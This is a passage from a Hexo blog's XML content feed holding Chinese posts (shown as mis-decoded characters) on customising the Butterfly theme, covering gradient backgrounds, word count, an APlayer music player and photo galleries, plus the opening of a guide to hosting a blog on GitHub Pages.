rgba(<span class="number">80</span>, <span class="number">115</span>, <span class="number">184</span>, <span class="number">0.1</span>) <span class="number">58</span>%,</span><br><span class="line">    rgba(<span class="number">16</span>, <span class="number">152</span>, <span class="number">173</span>, <span class="number">0.1</span>) <span class="number">72</span>%,</span><br><span class="line">    rgba(<span class="number">7</span>, <span class="number">179</span>, <span class="number">155</span>, <span class="number">0.1</span>) <span class="number">86</span>%,</span><br><span class="line">    rgba(<span class="number">109</span>, <span class="number">186</span>, <span class="number">130</span>, <span class="number">0.1</span>) <span class="number">100</span>%</span><br><span class="line">  );</span><br><span class="line">  background: -ms-linear-gradient(</span><br><span class="line">    0deg,</span><br><span class="line">    rgba(<span class="number">247</span>, <span class="number">149</span>, <span class="number">51</span>, <span class="number">0.1</span>) <span class="number">0</span>,</span><br><span class="line">    rgba(<span class="number">243</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">0.1</span>) <span class="number">15</span>%,</span><br><span class="line">    rgba(<span class="number">239</span>, <span class="number">78</span>, <span class="number">123</span>, <span class="number">0.1</span>) <span class="number">30</span>%,</span><br><span class="line">    rgba(<span class="number">161</span>, <span class="number">102</span>, <span class="number">171</span>, <span class="number">0.1</span>) <span class="number">44</span>%,</span><br><span class="line">    rgba(<span class="number">80</span>, <span class="number">115</span>, <span class="number">184</span>, <span class="number">0.1</span>) <span class="number">58</span>%,</span><br><span class="line">    rgba(<span class="number">16</span>, <span class="number">152</span>, <span class="number">173</span>, <span class="number">0.1</span>) <span class="number">72</span>%,</span><br><span class="line">    rgba(<span class="number">7</span>, <span class="number">179</span>, <span class="number">155</span>, <span class="number">0.1</span>) <span class="number">86</span>%,</span><br><span class="line">    rgba(<span class="number">109</span>, <span class="number">186</span>, <span class="number">130</span>, <span class="number">0.1</span>) <span class="number">100</span>%</span><br><span class="line">  );</span><br><span class="line">  background: linear-gradient(</span><br><span class="line">    90deg,</span><br><span class="line">    rgba(<span class="number">247</span>, <span class="number">149</span>, <span class="number">51</span>, <span class="number">0.1</span>) <span class="number">0</span>,</span><br><span class="line">    rgba(<span class="number">243</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">0.1</span>) <span class="number">15</span>%,</span><br><span class="line">    rgba(<span class="number">239</span>, <span class="number">78</span>, <span class="number">123</span>, <span class="number">0.1</span>) <span class="number">30</span>%,</span><br><span class="line">    rgba(<span class="number">161</span>, <span class="number">102</span>, <span class="number">171</span>, <span class="number">0.1</span>) <span class="number">44</span>%,</span><br><span class="line">    rgba(<span class="number">80</span>, <span class="number">115</span>, <span class="number">184</span>, <span class="number">0.1</span>) <span class="number">58</span>%,</span><br><span class="line">    rgba(<span class="number">16</span>, <span class="number">152</span>, <span class="number">173</span>, <span class="number">0.1</span>) <span class="number">72</span>%,</span><br><span class="line">    rgba(<span class="number">7</span>, <span class="number">179</span>, <span class="number">155</span>, <span class="number">0.1</span>) <span class="number">86</span>%,</span><br><span class="line">    rgba(<span class="number">109</span>, <span class="number">186</span>, <span class="number">130</span>, <span class="number">0.1</span>) <span class="number">100</span>%</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹é…ç½®æ–‡ä»¶_config.butterfly.ymlçš„å¼•å…¥æ–¹å¼</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Inject</span><br><span class="line"># æ’å…¥ä»£ç åˆ°å¤´éƒ¨ &lt;/head&gt; ä¹‹å‰ å’Œ åº•éƒ¨ &lt;/body&gt; ä¹‹å‰</span><br><span class="line">inject:</span><br><span class="line">  head:</span><br><span class="line">     - &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/css/background.css&quot;</span>&gt;</span><br><span class="line">  bottom:</span><br><span class="line">    # - &lt;script src=<span class="string">&quot;xxxx&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>å¦‚æœèƒŒæ™¯è‰²ä¸ç”Ÿæ•ˆï¼Œè®¾ç½®_config.butterfly.yml</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Website <span class="title function_">Background</span> <span class="params">(è¨­ç½®ç¶²ç«™èƒŒæ™¯)</span></span><br><span class="line"># can set it to color or <span class="title function_">image</span> <span class="params">(å¯è¨­ç½®åœ–ç‰‡ æˆ–è€… é¡”è‰²)</span></span><br><span class="line"># The formal of image: url(http:<span class="comment">//xxxxxx.com/xxx.jpg)</span></span><br><span class="line">background: <span class="string">&#x27;#efefef&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091740434.png" alt="image-20240409174058336">  </p><h1 id="footerèƒŒæ™¯"><a href="#footerèƒŒæ™¯" class="headerlink" title="footerèƒŒæ™¯"></a>footerèƒŒæ™¯</h1><p>footer çš„èƒŒæ™¯ï¼Œå½“è®¾ç½® false æ—¶ï¼Œå°†ä¸ä¸»é¢˜è‰²ä¸€è‡´ã€‚ä¿®æ”¹ä¸»é¢˜é…ç½®æ–‡ä»¶_config.butterfly.yml</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># footeræ˜¯å¦æ˜¾ç¤ºå›¾ç‰‡èƒŒæ™¯(ä¸top_imgä¸€è‡´)</span><br><span class="line">footer_bg: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091741053.png" alt="image-20240409174152727"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091742215.png" alt="image-20240409174205076">  </p><h1 id="å­—æ•°ç»Ÿè®¡"><a href="#å­—æ•°ç»Ÿè®¡" class="headerlink" title="å­—æ•°ç»Ÿè®¡"></a>å­—æ•°ç»Ÿè®¡</h1><p>å®‰è£…ç»Ÿè®¡ç»„ä»¶</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">npm install hexo-wordcount --save or yarn add hexo-wordcount</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ä¸»é¢˜é…ç½®æ–‡ä»¶_config.butterfly.yml</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># wordcount (å­—æ•¸çµ±è¨ˆ)</span><br><span class="line">wordcount:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  post_wordcount: <span class="literal">true</span></span><br><span class="line">  min2read: <span class="literal">true</span></span><br><span class="line">  total_wordcount: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091742197.png" alt="image-20240409174215114">  </p><h1 id="æ·»åŠ éŸ³ä¹æ’­æ”¾å™¨"><a href="#æ·»åŠ éŸ³ä¹æ’­æ”¾å™¨" class="headerlink" title="æ·»åŠ éŸ³ä¹æ’­æ”¾å™¨"></a>æ·»åŠ éŸ³ä¹æ’­æ”¾å™¨</h1><h2 id="æ’ä»¶å®‰è£…ä¸é…ç½®"><a href="#æ’ä»¶å®‰è£…ä¸é…ç½®" class="headerlink" title="æ’ä»¶å®‰è£…ä¸é…ç½®"></a>æ’ä»¶å®‰è£…ä¸é…ç½®</h2><p>å®‰è£… <a href="https://github.com/MoePlayer/hexo-tag-aplayer">hexo-tag-aplayer</a> è¿™æ¬¾æ’ä»¶ã€‚æ‰§è¡Œå¦‚ä¸‹æŒ‡ä»¤ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-tag-aplayer</span><br></pre></td></tr></table></figure><p>æ’ä»¶é…ç½®æ–¹å¼ä¸ºä¿®æ”¹Hexo çš„é…ç½®æ–‡ä»¶ä¸­è¿›è¡Œå¦‚ä¸‹ä¿®æ”¹ã€‚å°±æ˜¯ä½ çš„<a href="https://so.csdn.net/so/search?q=Hexo&spm=1001.2101.3001.7020">Hexo</a>æ ¹ç›®å½•ä¸‹çš„_config.ymlæ–‡ä»¶ã€‚</p><p>è¿™å—ç›´æ¥æœï¼Œæ²¡æœ‰åœ¨Hexoç›®å½•ä¸‹çš„_config.ymlæ–‡ä»¶ä¸­æ‰¾åˆ°ï¼Œå°†å¦‚ä¸‹å†…å®¹æ·»åŠ ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">aplayer:</span><br><span class="line">  meting: <span class="literal">true</span></span><br><span class="line">  asset_inject: <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>ä¸»é¢˜é…ç½®æ–‡ä»¶_config.butterfly.ymlä¸­å¼€å¯aplayerInjectï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Inject the css and <span class="title function_">script</span> <span class="params">(aplayer/meting)</span></span><br><span class="line">aplayerInject:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  per_page: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>ä¸‹é¢ä»‹ç»ä¸¤ç§å¸¸è§çš„ç”¨æ³•ï¼š</p><h2 id="æ™®é€šé¡µé¢æ’­æ”¾å™¨"><a href="#æ™®é€šé¡µé¢æ’­æ”¾å™¨" class="headerlink" title="æ™®é€šé¡µé¢æ’­æ”¾å™¨"></a>æ™®é€šé¡µé¢æ’­æ”¾å™¨</h2><p>åœ¨åšå®¢éŸ³ä¹æ’­æ”¾é¡µé¢ï¼ˆ&#x2F;source&#x2F;music&#x2F;index.mdï¼‰ä¸­æ·»åŠ å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;% meting <span class="string">&quot;8872308188&quot;</span> <span class="string">&quot;netease&quot;</span> <span class="string">&quot;playlist&quot;</span> <span class="string">&quot;autoplay&quot;</span> <span class="string">&quot;mutex:false&quot;</span> <span class="string">&quot;listmaxheight:400px&quot;</span> <span class="string">&quot;preload:none&quot;</span> <span class="string">&quot;theme:#ad7a86&quot;</span>%&#125;</span><br></pre></td></tr></table></figure><p>å¸¸ç”¨çš„é€‰é¡¹å¦‚ä¸‹æ‰€ç¤º:</p><p><strong>serverå¯é€‰</strong>ï¼šneteaseï¼ˆç½‘æ˜“äº‘éŸ³ä¹ï¼‰ï¼Œtencentï¼ˆQQéŸ³ä¹ï¼‰ï¼Œkugouï¼ˆé…·ç‹—éŸ³ä¹ï¼‰ï¼Œxiamiï¼ˆè™¾ç±³éŸ³ä¹ï¼‰ï¼Œbaiduï¼ˆç™¾åº¦éŸ³ä¹ï¼‰ã€‚å»ºè®®ç½‘æ˜“äº‘</p><p><strong>typeå¯é€‰</strong>ï¼šsongï¼ˆæ­Œæ›²ï¼‰ï¼Œplaylistï¼ˆæ­Œå•ï¼‰ï¼Œalbumï¼ˆä¸“è¾‘ï¼‰ï¼Œsearchï¼ˆæœç´¢å…³é”®å­—ï¼‰ï¼Œartistï¼ˆæ­Œæ‰‹ï¼‰ã€‚æ·»åŠ å•æ›²é€‰çš„æ­Œæ›²ï¼Œæ­Œå•é€‰æ‹©playlistï¼Œå¯ä»¥è‡ªè¡Œå°è¯•ã€‚</p><p><strong>idè·å–ç¤ºä¾‹</strong>: æ‰“å¼€ç½‘æ˜“äº‘éŸ³ä¹ï¼Œé€‰æ‹©å–œæ¬¢çš„æ­Œå•ï¼Œåœ¨ç½‘é¡µç‰ˆæ‰“å¼€ï¼Œè·å–æ­Œå•listï¼Œå¡«å…¥å³å¯ã€‚ä½¿ç”¨çš„æ—¶å€™å°†ä¸Šè¾¹çš„IDå·æ¢ä¸ºè‡ªå·±å–œæ¬¢çš„æ­Œå•å³å¯ã€‚æ³¨æ„æ­Œå•ä¸­ä¸èƒ½åŒ…æ‹¬VIPéŸ³ä¹ï¼Œå¦åˆ™æ— æ³•è§£æã€‚å»ºè®®å•ç‹¬å»ºç«‹ä¸€ä¸ªæ­Œå•ï¼Œä»¥åæœ‰å–œæ¬¢çš„éŸ³ä¹æ·»åŠ è¿›å»ï¼Œç½‘é¡µä¹Ÿä¼šè‡ªåŠ¨åŒæ­¥æ·»åŠ ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091742965.png" alt="image-20240409174227907">  </p><p>lrcTypeè®¾ç½®ä¸º -1é»˜è®¤æ˜¾ç¤ºæ­Œè¯ï¼Œæ”¾åœ¨fixedæ¨¡å¼ä¸‹æ¯”è¾ƒåˆé€‚ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091743652.png" alt="image-20240409174302343">  </p><h2 id="å…¨å±€å¸åº•Aplayeræ¨¡å¼"><a href="#å…¨å±€å¸åº•Aplayeræ¨¡å¼" class="headerlink" title="å…¨å±€å¸åº•Aplayeræ¨¡å¼"></a>å…¨å±€å¸åº•Aplayeræ¨¡å¼</h2><p>æŠŠ aplayerä»£ç  æ’å…¥åˆ°ä¸»é¢˜é…ç½®æ–‡ä»¶_config.butterfly.ymlçš„ inject.bottom å³å¯ã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">inject:</span><br><span class="line">  head:</span><br><span class="line">  bottom:</span><br><span class="line">    - &lt;div class=<span class="string">&quot;aplayer no-destroy&quot;</span> data-id=<span class="string">&quot;7422861869&quot;</span> data-server=<span class="string">&quot;netease&quot;</span> data-type=<span class="string">&quot;playlist&quot;</span> data-fixed=<span class="string">&quot;true&quot;</span> data-autoplay=<span class="string">&quot;true&quot;</span> data-lrcType=<span class="string">&quot;-1&quot;</span>&gt; &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>éœ€è¦ä¿®æ”¹çš„å‚æ•°å°±åªæœ‰data-idã€data-serverã€data-typeã€data-autoplay&#x3D;â€trueâ€ã€data-lrcType&#x3D;â€-1â€ä¸€äº›å¸¸ç”¨çš„å‚æ•°ï¼Œå¯ä»¥è‡ªè¡Œæ ¹æ®éœ€è¦ä¿®æ”¹ã€‚</p><p>æœ€åï¼Œå¦‚æœä½ æƒ³åˆ‡æ¢é¡µé¢æ—¶ï¼ŒéŸ³ä¹ä¸ä¼šä¸­æ–­ã€‚è¯·æŠŠä¸»é¢˜é…ç½®æ–‡ä»¶çš„ pjax è®¾ä¸º trueå³å¯ã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">pjax:</span><br><span class="line"> enable: ture</span><br><span class="line"> exclude:</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091743658.png" alt="image-20240409174316617"> </p><h1 id="åˆ›å»ºä¸»é¢˜å›¾åº“"><a href="#åˆ›å»ºä¸»é¢˜å›¾åº“" class="headerlink" title="åˆ›å»ºä¸»é¢˜å›¾åº“"></a>åˆ›å»ºä¸»é¢˜å›¾åº“</h1><p>æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œåˆ›å»ºphotosé¡µé¢</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">hexo n page photos     #åˆ›å»ºä½ çš„é¡µé¢   </span><br></pre></td></tr></table></figure><p>åœ¨index.mdæ–‡ä»¶çš„ Front-matter ä¸­æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼ˆä¸ç°å®ä¾§è¾¹æ å’Œè¯„è®ºåŒºï¼‰</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091743503.png" alt="image-20240409174322454"> </p><p>æ·»åŠ å›¾åº“é›†åˆé¡µ</p><p>å›¾åº“é›†åˆé¡µé¢å°±æ˜¯æ™®é€šçš„é¡µé¢ï¼Œæ¯”å¦‚ä¸Šé¢åˆ›å»ºçš„&#x2F;photos&#x2F;index.mdé¡µé¢ï¼Œä¸‹é¢å°†å…¶è®¾ç½®æˆä¸€ä¸ªå›¾åº“é›†åˆé¡µé¢ï¼è®¾ç½®å›¾åº“é›†åˆé¡µé¢æ˜¯ä½¿ç”¨å¤–æŒ‚æ ‡ç­¾æ¥å®ç°çš„ï¼Œä¹¦å†™æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;div class=<span class="string">&quot;gallery-group-main&quot;</span>&gt;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¢æ¯ä¸ªgalleryGroupä¸­è®¾ç½®çš„å†…å®¹å¦‚ä¸‹ï¼š</p><ul><li>nameï¼šå›¾åº“åå­—</li><li>descriptionï¼šå›¾åº“æè¿°</li><li>linkï¼šé“¾æ¥åˆ°å¯¹åº”ç›¸å†Œåœ°å€</li><li>img-urlï¼šå›¾åº“å°é¢åœ°å€</li></ul><p>å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;div class=<span class="string">&quot;gallery-group-main&quot;</span>&gt;</span><br><span class="line">&#123;% galleryGroup <span class="string">&#x27;å£ç´™&#x27;</span> <span class="string">&#x27;æ”¶è—çš„ä¸€äº›å£çº¸ï¼Œä¾µåˆ &#x27;</span> <span class="string">&#x27;/album/wallpaper&#x27;</span> https:<span class="comment">//www.czblogs.cn/album/wallpaper.jpeg %&#125;</span></span><br><span class="line">&#123;% galleryGroup <span class="string">&#x27;é£æ™¯&#x27;</span> <span class="string">&#x27;ç›¸å†Œæ˜¯æˆ‘å¿«ä¹è¿‡çš„è¯æ®&#x27;</span> <span class="string">&#x27;/album/life&#x27;</span> https:<span class="comment">//www.czblogs.cn/album/life.jpeg %&#125;</span></span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>è¿™æ ·è®¾ç½®åï¼Œé¡µé¢å°±å˜æˆäº†è¿™æ ·</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091743457.png" alt="image-20240409174346000">  </p><p>å›¾åº“å­é¡µé¢</p><p>æ­¤æ—¶ï¼Œç‚¹å‡»ä»»ä½•ä¸€ä¸ªå›¾é›†ï¼Œéƒ½ä¼šé‡å®šå‘åˆ° 404 é¡µï¼è¿™æ˜¯å› ä¸ºæˆ‘ä»¬è¿˜æ²¡æœ‰åˆ›å»ºç›¸åº”çš„å­é¡µé¢ï¼è¿™é‡Œæˆ‘ä»¥ã€Šç”Ÿæ´»ã€‹è¿™ä¸ªç›¸å†Œä¸ºä¾‹æ¥åˆ›å»ºå®ƒçš„å­é¡µé¢ï¼</p><p>ç¬¬ä¸€æ­¥ï¼šæ‰“å¼€ç»ˆç«¯ï¼Œåˆ‡æ¢åˆ°æœ¬åœ° Hexo åšå®¢çš„æ ¹ç›®å½•ä¸‹ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> <span class="title class_">page</span> life</span><br></pre></td></tr></table></figure><p>ç„¶åä¼šåœ¨åšå®¢æ ¹ç›®å½•ä¸‹çš„&#x2F;sourceç›®å½•ä¸‹ç”Ÿæˆåä¸ºlifeçš„æ–‡ä»¶å¤¹ï¼Œå¹¶åœ¨å…¶ä¸­ç”Ÿæˆä¸€ä¸ªåä¸ºindex.mdçš„æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶å°±å¯¹åº”ç€ã€Šç”Ÿæ´»ã€‹è¿™ä¸ªå­é¡µé¢ï¼</p><p>ä½†æ˜¯æ­¤æ—¶å›¾åº“å­é¡µé¢&#x2F;source&#x2F;life&#x2F;index.mdè·Ÿç›¸å†Œé¦–é¡µ&#x2F;source&#x2F;photos&#x2F;index.mdæ˜¯å¹³çº§çš„ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091744958.png" alt="image-20240409174400897">  </p><p>ç¬¬äºŒæ­¥ï¼šå°†lifeæ•´ä¸ªæ–‡ä»¶å¤¹éƒ½ç§»åŠ¨åˆ°albumæ–‡ä»¶å¤¹ä¸­ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091744854.png" alt="image-20240409174408799">  </p><p>ç¬¬ä¸‰æ­¥ï¼šæ­¤æ—¶æ‰“å¼€&#x2F;source&#x2F;photos&#x2F;life&#x2F;index.mdæ–‡ä»¶ï¼Œä¿®æ”¹å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091744316.png" alt="image-20240409174417267">  </p><p>ç¬¬å››æ­¥ï¼šç„¶ååœ¨å­é¡µé¢ï¼ˆä¹Ÿå°±æ˜¯&#x2F;source&#x2F;photos&#x2F;life&#x2F;index.mdï¼‰ä¸­ä½¿ç”¨æ ‡ç­¾å¤–æŒ‚æŒ‚ä¸Šè‡ªå·±çš„ç…§ç‰‡ï¼Œå†™æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">![]()</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚æˆ‘ä¸‹é¢è¿™æ ·ï¼Œå¡«å†™å¾ˆå¤šä¸ªè‡ªå·±çš„å›¾ç‰‡ï¼ˆå›¾ç‰‡è·¯å¾„éœ€è¦è‡ªå·±å¡«å……ï¼‰ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">![](https:<span class="comment">//w.wallhaven.cc/full/72/wallhaven-72yzje.jpg)</span></span><br><span class="line">![](https:<span class="comment">//w.wallhaven.cc/full/l8/wallhaven-l8v3ey.png)</span></span><br><span class="line">![](https:<span class="comment">//w.wallhaven.cc/full/1p/wallhaven-1poo61.jpg)</span></span><br><span class="line">![](https:<span class="comment">//w.wallhaven.cc/full/kx/wallhaven-kxj3l1.jpg)</span></span><br><span class="line">![](https:<span class="comment">//w.wallhaven.cc/full/jx/wallhaven-jxl31y.png)</span></span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091744405.png" alt="image-20240409174443067">   </p><h1 id="ç•™è¨€æ¿"><a href="#ç•™è¨€æ¿" class="headerlink" title="ç•™è¨€æ¿"></a>ç•™è¨€æ¿</h1><p>å…·ä½“å®ç°å¯å‚è€ƒï¼š<a href="https://fe32.top/articles/hexo1611/">https://fe32.top/articles/hexo1611/</a></p>]]></content>
      
      
      <categories>
          
          <category> åšå®¢æ­å»º </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> blog </tag>
            
            <tag> ä¸»é¢˜ </tag>
            
            <tag> butterfly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»0åˆ°-1æ­å»ºä¸ªäººåšå®¢</title>
      <link href="/2024/03/19/%E4%BB%8E0%E5%88%B0-1%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2024/03/19/%E4%BB%8E0%E5%88%B0-1%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä½¿ç”¨Hexoå’ŒGitHubæ­å»ºåšå®¢çš„åŸç†ä¸»è¦æ¶‰åŠé™æ€ç½‘ç«™ç”Ÿæˆä¸æ‰˜ç®¡ä¸¤ä¸ªæ ¸å¿ƒç¯èŠ‚ï¼š</p><p>é¦–å…ˆï¼ŒHexoæ˜¯ä¸€ä¸ªåŸºäºNode.jsçš„é™æ€åšå®¢æ¡†æ¶ã€‚å®ƒçš„å·¥ä½œåŸç†æ˜¯è§£æä½¿ç”¨Markdownï¼ˆæˆ–å…¶ä»–æ¸²æŸ“å¼•æ“ï¼‰ç¼–å†™çš„æ–‡ç« ï¼Œå¹¶åˆ©ç”¨ä¸»é¢˜æ¨¡æ¿ç”Ÿæˆé™æ€ç½‘é¡µã€‚è¿™æ„å‘³ç€ï¼Œå½“ä½¿ç”¨Hexoåˆ›å»ºåšå®¢æ—¶ï¼Œå…¶å®æ˜¯åœ¨æœ¬åœ°ç¼–å†™å’Œé¢„è§ˆåšå®¢çš„å†…å®¹ã€‚Hexoçš„ä¼˜åŠ¿åœ¨äºå…¶å¿«é€Ÿã€ç®€æ´ä¸”é«˜æ•ˆï¼Œä½¿åˆ›ä½œè€…æ— éœ€å…³æ³¨å¤ªå¤šæŠ€æœ¯ç»†èŠ‚ã€‚</p><p>ç„¶åï¼Œç”Ÿæˆçš„é™æ€ç½‘é¡µéœ€è¦æ‰˜ç®¡åˆ°ç½‘ç»œä¸Šä»¥ä¾›ä»–äººè®¿é—®ã€‚GitHub Pagesæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„é€‰æ‹©ï¼Œå®ƒæ˜¯ä¸€ä¸ªå…è®¸ç”¨æˆ·åœ¨å…¶GitHubä»“åº“ä¸Šæ‰˜ç®¡é™æ€ç½‘é¡µçš„æœåŠ¡ã€‚é€šè¿‡å°†Hexoç”Ÿæˆçš„é™æ€ç½‘é¡µæ¨é€åˆ°GitHubä»“åº“ï¼Œå¹¶åˆ©ç”¨GitHub Pagesçš„è®¾ç½®åŠŸèƒ½ï¼Œå°±å¯ä»¥å°†åšå®¢å‘å¸ƒåˆ°äº’è”ç½‘ä¸Šã€‚</p><p>å› æ­¤ï¼Œä½¿ç”¨Hexo+GitHubæ­å»ºåšå®¢çš„åŸç†å°±æ˜¯ï¼šåˆ©ç”¨Hexoç”Ÿæˆé™æ€ç½‘é¡µï¼Œç„¶åå°†è¿™äº›ç½‘é¡µæ‰˜ç®¡åˆ°GitHub Pagesä¸Šï¼Œä»è€Œå®ç°åšå®¢çš„åœ¨çº¿å‘å¸ƒå’Œè®¿é—®ã€‚</p><p>å…·ä½“æ¥è¯´ï¼Œæ­å»ºè¿‡ç¨‹ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š</p><ol><li>å®‰è£…Gitå’ŒNode.jsï¼Œè¿™æ˜¯ä½¿ç”¨Hexoå’ŒGitHubçš„å‰æã€‚</li><li>å®‰è£…Hexoï¼Œå¹¶åˆå§‹åŒ–åšå®¢é¡¹ç›®ã€‚</li><li>åœ¨GitHubä¸Šåˆ›å»ºä¸ªäººä»“åº“ï¼Œç”¨äºå­˜æ”¾åšå®¢çš„æºä»£ç å’Œé™æ€ç½‘é¡µã€‚</li><li>å°†Hexoç”Ÿæˆçš„é™æ€ç½‘é¡µæ¨é€åˆ°GitHubä»“åº“ã€‚</li><li>åœ¨GitHubä»“åº“ä¸­è®¾ç½®GitHub Pagesï¼Œé€‰æ‹©æ­£ç¡®çš„åˆ†æ”¯å’Œç›®å½•ï¼Œä»¥ä¾¿æ­£ç¡®æ‰˜ç®¡é™æ€ç½‘é¡µã€‚</li><li>æ›´æ”¹Hexoçš„ä¸»é¢˜ï¼Œä»¥å®šåˆ¶åšå®¢å¤–è§‚ã€‚</li><li>è®¾ç½®ä¸ªäººåŸŸåï¼ˆå¯é€‰ï¼‰ï¼Œä»¥ä¾¿ä½¿ç”¨è‡ªå®šä¹‰åŸŸåè®¿é—®åšå®¢ã€‚</li><li>å¼€å§‹ä½¿ç”¨Hexoç¼–å†™å’Œå‘å¸ƒæ–‡ç« ï¼Œæ¯æ¬¡å‘å¸ƒæ–°æ–‡ç« æ—¶ï¼Œåªéœ€è¿è¡ŒHexoçš„ç”Ÿæˆå‘½ä»¤ï¼Œç„¶åå°†ç”Ÿæˆçš„é™æ€ç½‘é¡µæ¨é€åˆ°GitHubå³å¯ã€‚</li></ol><h1 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h1><h2 id="æ³¨å†Œgithubè´¦å·"><a href="#æ³¨å†Œgithubè´¦å·" class="headerlink" title="æ³¨å†Œgithubè´¦å·"></a>æ³¨å†Œgithubè´¦å·</h2><p>å‰å¾€githubå®˜ç½‘è¿›è¡Œè´¦å·æ³¨å†Œã€‚ï¼ˆè‹¥å·²æœ‰è´¦å·ï¼Œæ­¤æ­¥éª¤å¯å¿½ç•¥ï¼‰</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">https://www.github.com/    </span><br></pre></td></tr></table></figure><p>æ³¨å†Œä¹‹åï¼Œè¦è®°ä½é‚®ç®±å’Œç”¨æˆ·åï¼Œè¿™å—åœ¨åé¢ä¼šç”¨åˆ°ã€‚</p><h2 id="å®‰è£…NodeJS"><a href="#å®‰è£…NodeJS" class="headerlink" title="å®‰è£…NodeJS"></a>å®‰è£…NodeJS</h2><p>Hexoæ˜¯åŸºäºNodeJSçš„é™æ€æ¡†æ¶åšå®¢ï¼Œæ‰€ä»¥ï¼Œå¦‚æœè¦å®‰è£…Hexoï¼Œå‰ææ¡ä»¶æ˜¯è¦æœ‰NodeJSçš„ç¯å¢ƒã€‚<br>è¿›å…¥NodeJSå®˜ç½‘ï¼Œä¸‹è½½å¯¹åº”çš„ç‰ˆæœ¬ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091709927.png" alt="image-20240409170903874">  </p><p>å¦‚æœæ˜¯windowsï¼Œå®‰è£…çš„æ—¶å€™å»ºè®®æ— è„‘ä¸‹ä¸€æ­¥å°±è¡Œï¼Œå¦‚æœ C ç›˜ä¸åƒç´§çš„è¯ï¼Œç„¶åå‹¾é€‰æ‰€æœ‰ç»„ä»¶ï¼Œå¹¶å‹¾é€‰ Add to Path å°†å…¶æ·»åŠ 